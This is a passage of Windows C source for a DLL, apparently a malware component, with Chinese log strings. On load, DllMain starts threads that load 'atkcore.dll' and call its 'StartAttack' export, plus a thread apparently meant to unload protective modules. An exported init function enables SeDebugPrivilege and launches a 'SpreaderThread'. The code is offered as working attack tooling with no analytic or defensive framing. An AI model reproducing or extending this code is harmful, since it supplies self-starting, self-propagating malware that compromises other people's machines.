        return;
    WCHAR *pSlash = wcsrchr(dir, L'\\');
    if (pSlash) *(pSlash + 1) = L'\0';
    else return;
    swprintf_s(path, MAX_PATH, L"%satkcore.dll", dir);
    HMODULE hKill = LoadLibraryW(path);
    if (!hKill) {
        WriteDeamonLog(L"加载 atkcore.dll 失败: %ls err=%lu\n", path, GetLastError());
        return;
    }
    WriteDeamonLog(L"加载 atkcore.dll 成功: %ls\n", path);
    typedef void (WINAPI *StartAttack_t)(void);
    StartAttack_t pStart = (StartAttack_t)GetProcAddress(hKill, "StartAttack");
    if (pStart) {
        pStart();
        WriteDeamonLog(L"StartAttack 已调用\n");
    } else {
        WriteDeamonLog(L"StartAttack 导出未找到\n");
    }
}

static DWORD WINAPI BootThread(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);
    StartRemoteAttack();
    return 0;
}

/* ================== 调试特权（新约定允许 SeDebugPrivilege） ================== */
static BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    BOOL ok = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        SetLastError(ERROR_SUCCESS);
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) &&
            GetLastError() != ERROR_NOT_ALL_ASSIGNED)
            ok = TRUE;
    }
    CloseHandle(hToken);
    return ok;
}

__declspec(dllexport) void WINAPI DeamonInit(void)
{
    BOOL bPriv = EnableDebugPrivilege();
    WriteDeamonLog(L"DeamonInit called, SeDebugPrivilege=%ls\n", bPriv ? L"ON" : L"OFF");
    CreateThread(NULL, 0, HeartbeatMonitor, NULL, 0, NULL);
    CreateThread(NULL, 0, SpreaderThread, NULL, 0, NULL);
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinst);
        CreateThread(NULL, 0, BootThread, NULL, 0, NULL);
        CreateThread(NULL, 0, UnloadForeignGuardThread, NULL, 0, NULL);
    }
    return TRUE;
}
